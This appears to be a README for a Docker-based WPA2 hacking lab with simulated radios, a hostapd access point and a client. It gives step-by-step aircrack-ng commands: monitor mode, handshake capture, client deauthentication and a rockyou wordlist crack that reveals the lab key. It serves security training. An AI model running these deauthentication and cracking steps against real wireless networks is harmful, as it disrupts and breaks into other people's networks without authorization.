# WPA2 Lab — Docker Setup

## Architecture

```
Host Kernel (mac80211_hwsim)
  ├── wlan0  →  Container A (ap)      — hostapd running WPA2 AP (SSID: wifi-lab)
  ├── wlan1  →  Container B (client)  — wpa_supplicant connected to wifi-lab
  └── wlan2  →  HOST / Kali           — your attack interface
```

All three virtual radios are on the same simulated "air" — they all see each other's frames.

---

## Prerequisites (Kali host)

```bash
sudo apt install -y docker.io docker-compose aircrack-ng
sudo systemctl start docker
```

Make sure `mac80211_hwsim` is available:
```bash
modinfo mac80211_hwsim   # should print module info
```

---

## Start the lab

```bash
docker compose up --build
```

Wait until you see hostapd printing `AP-ENABLED` and the client showing `CTRL-EVENT-CONNECTED`.

Verify the virtual interfaces exist on the host:
```bash
iw dev
# Should show wlan0, wlan1, wlan2
```

---

## Attack from Kali (wlan2)

### 1. Enable monitor mode
```bash
sudo airmon-ng start wlan2
# Creates wlan2mon (or wlan2 stays with type monitor on some kernels)
```

### 2. Scan — confirm the AP is visible
```bash
sudo airodump-ng wlan2mon
# Look for SSID: wifi-lab, Channel: 6, Encryption: WPA2
# Note the BSSID (AP MAC) and the CLIENT MAC
```

### 3. Start capture on the AP channel
```bash
sudo airodump-ng -c 6 --bssid <AP_BSSID> -w capture wlan2mon
# Keep this running in a terminal
```

### 4. Deauthenticate the client
```bash
sudo aireplay-ng -0 5 -a <AP_BSSID> -c <CLIENT_MAC> wlan2mon
# This will deauthenticate the client. Make sure that after the deauthentication, the airodump capture the WPA2 handshake
```

### 5. Crack the handshake
```bash
sudo aircrack-ng <CAPTURE_FILE>.cap -w /usr/share/wordlists/rockyou.txt

# Expected output:
# KEY FOUND! [ cookie123 ]
```

---

## WPA2 key in this lab

The key is: `cookie123`

---
